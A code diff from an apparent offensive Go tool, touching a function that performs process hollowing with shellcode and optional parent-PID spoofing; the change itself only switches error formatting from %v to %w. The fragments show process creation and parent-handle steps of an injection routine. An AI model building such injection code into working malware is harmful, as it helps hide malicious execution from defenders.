@@ -80,7 +80,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 
 	targetUTF16, err := syscall.UTF16PtrFromString(params.Target)
 	if err != nil {
-		return sb.String(), fmt.Errorf("invalid target path: %v", err)
+		return sb.String(), fmt.Errorf("invalid target path: %w", err)
 	}
 
 	var si syscall.StartupInfo
@@ -118,7 +118,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 				0, uintptr(params.Ppid),
 			)
 			if parentHandle == 0 {
-				return sb.String(), fmt.Errorf("open parent PID %d: %v", params.Ppid, openErr)
+				return sb.String(), fmt.Errorf("open parent PID %d: %w", params.Ppid, openErr)
 			}
 			defer procCloseHandle.Call(parentHandle)
 
@@ -161,7 +161,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 			uintptr(unsafe.Pointer(&pi)),
 		)
 		if ret == 0 {
-			return sb.String(), fmt.Errorf("CreateProcessW failed: %v", lastErr)
+			return sb.String(), fmt.Errorf("CreateProcessW failed: %w", lastErr)
 		}
 	} else {
 		err = syscall.CreateProcess(
@@ -169,7 +169,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 			createFlags, nil, nil, &si, &pi,
 		)
 		if err != nil {
-			return sb.String(), fmt.Errorf("CreateProcess failed: %v", err)
+			return sb.String(), fmt.Errorf("CreateProcess failed: %w", err)
 		}
 	}
 	defer syscall.CloseHandle(pi.Process)
